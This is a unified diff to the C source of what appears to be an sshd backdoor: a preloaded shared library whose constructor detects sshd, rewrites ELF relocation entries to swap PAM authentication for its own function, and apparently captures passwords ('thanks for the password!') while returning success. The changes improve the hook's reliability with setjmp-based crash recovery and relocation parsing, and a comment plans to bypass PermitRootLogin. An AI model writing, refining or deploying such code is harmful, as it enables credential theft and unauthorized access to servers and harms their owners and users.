@@ -5,6 +5,7 @@
 #include <stdbool.h>
 #include <errno.h>
 #include <signal.h>
+#include <setjmp.h>
 
 #include <security/pam_appl.h>
 #include <sys/mman.h>
@@ -24,16 +25,9 @@
 
 static int PAGE_SIZE;
 
-static void handlesigsegv(int sig)
+static void handle_sig_with_jmp(int sig)
 {
-	/*
-	 * TODO SIGBUS and actually handle an error
-	 */
-
-
-	/* unregister us */
-	signal(sig, SIG_DFL);
-	kill(getpid(), sig);
+	longjmp(jmpbuf, -1);
 }
 
 /*
@@ -122,9 +116,21 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func)
 {
 	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));
 
+	uint64_t shift32;
+	uint64_t low32;
+	void *ptr;
+
 	int i;
 	for (i = 0; i < relaments; i++) {
 		if ((void *) RELA[0].r_addend == func)
+			return RELA;
+
+		shift32 = (uintptr_t) (ELF64_R_SYM(RELA[0].r_info)) << 32;
+		low32 = (uintptr_t) (ELF64_R_TYPE(RELA[0].r_info)) & 0xFFFFFFFF;
+
+		ptr = (void *) ((uintptr_t) shift32 | (uintptr_t) low32);
+
+		if (ptr == func)
 			return RELA;
 
 		RELA = (Elf64_Rela *) ((char *) RELA + (unsigned long long) (sizeof(Elf64_Rela)));
@@ -134,24 +140,12 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func)
 
 /*
  * parses the relocation table only associated with PLT entries (DT_PLTREL)
- *	same as above	
- * TODO: necessary to rewrite this table? still worth testing for sure
+ *
+ * don't think this is needed -- in either DT_RELA or DT_PLTREL it looks like the relocation method 
+ *	is either an absolute address at r_addend or the bitwise logic shown above
+ * TODO: axe me?
  */
-static Elf64_Rela *parse_jmprel(Elf64_Rela *JMPREL, uint64_t *PLTRELSZ, void *funcneedle)
-{
-	uint64_t jmpelements = *PLTRELSZ / (sizeof(Elf64_Rela));
-	
-	int i;	
-	for (i = 0; i < jmpelements; i++) {
-
-/*		fprintf(fp, "r_offset = %16p  r_info[type = %10p  sym = %10llu]  r_addend = %10p \n",
-				JMPREL[0].r_offset,
-				ELF64_R_TYPE(JMPREL[0].r_info), ELF64_R_SYM(JMPREL[0].r_info), JMPREL[0].r_addend);
-*/		
-		JMPREL = (Elf64_Rela *) ((char*) JMPREL + (unsigned long long) (sizeof(Elf64_Rela)));
-	}
-	return NULL;
-}
+static Elf64_Rela *parse_jmprel(Elf64_Rela *JMPREL, uint64_t *PLTRELSZ, void *func);
 
 /*
  * the callback for dl_iterate_phdr
@@ -170,13 +164,15 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 					null1 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
 					break;
 				}
-				if (info->dlpi_phnum == (unsigned)4)  {
+				if (info->dlpi_phnum == (unsigned)4) {
 					null2 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
 					break;
 				}
 			}
-			if (strstr(info->dlpi_name, "libc.so") != NULL)
+			if (strstr(info->dlpi_name, "libc.so") != NULL) {
 				libc = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
+				break;
+			}
 		}
 	}
 	return 0;
@@ -185,7 +181,7 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 /*
  * this function is simple, the work is all in the functions that lead to this
  */
-int hook(Elf64_Rela *foundrela, void *func)
+static int hook_rela(Elf64_Rela *foundrela, void *func)
 {
 	int ret;
 	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;
@@ -205,7 +201,7 @@ int hook(Elf64_Rela *foundrela, void *func)
 
 static int is_sshd(struct link_map *link_map)
 {
-	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
+	void *dlhandle = dlopen("libdl.so.2", RTLD_NOW);
 
 	if (dlhandle == NULL)
 		return -1;
@@ -241,7 +237,10 @@ static int is_sshd(struct link_map *link_map)
 	return 0;
 }
 
-int my_pam_auth(struct pam_handle *pamh, int flags)
+/*
+ * TODO: fix PermitRootLogin
+ */
+static int my_pam_auth(struct pam_handle *pamh, int flags)
 {
 	__asm__ (
 		"nop;"
@@ -264,13 +263,12 @@ int my_pam_auth(struct pam_handle *pamh, int flags)
 	/* thanks for the password! */
 
 	
-	
 	free(msg);
 	free(resp);		
 	return 0;
 }
 
-static void  __attribute__ ((constructor)) bad(void)
+static void  __attribute__ ((constructor)) init(void)
 {
 	struct link_map *link_map;
 
@@ -283,10 +281,6 @@ static void  __attribute__ ((constructor)) bad(void)
 
 	dlinfoptr(ourhandle, 2, &link_map);
 	dlclose(ourhandle);
-
-	signal(SIGSEGV, handlesigsegv);
-
-	/* TODO: hook pam_acct_mgmt to allow usernames */
 
 	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
 	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
@@ -311,7 +305,20 @@ static void  __attribute__ ((constructor)) bad(void)
 	if (!foundrela)
 		return;
 
-	hook(foundrela, my_pam_auth);
+	int jmpret = setjmp(jmpbuf);
+	if (jmpret != 0) { /* PANIC */
+		kill(getpid(), SIGSEGV);
+		return;
+	}
 
+	signal(SIGSEGV, handle_sig_with_jmp);
+	signal(SIGBUS, handle_sig_with_jmp);
+
+	hook_rela(foundrela, my_pam_auth);
+
+	signal(SIGSEGV, SIG_DFL);
+	signal(SIGBUS, SIG_DFL);
+
+	
 	return;
 }
